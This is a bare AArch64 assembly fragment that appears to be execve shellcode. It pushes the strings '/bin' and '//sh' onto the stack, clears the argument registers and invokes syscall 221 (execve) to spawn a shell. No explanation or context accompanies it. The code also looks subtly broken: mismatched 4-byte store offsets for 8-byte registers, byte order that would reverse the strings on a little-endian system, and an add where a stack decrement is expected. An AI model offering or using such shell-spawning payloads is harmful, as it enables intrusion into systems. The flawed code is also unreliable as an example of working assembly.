add    sp, sp, 2048
ldr    x7, =0x2f62696e
str    x7, [sp, -4]!
ldr    x7, =0x2f2f7368
str    x7, [sp, -4]!
mov    x0, sp
eor    x1, x1, x1
eor    x2, x2, x2
mov    x8, #221
svc    0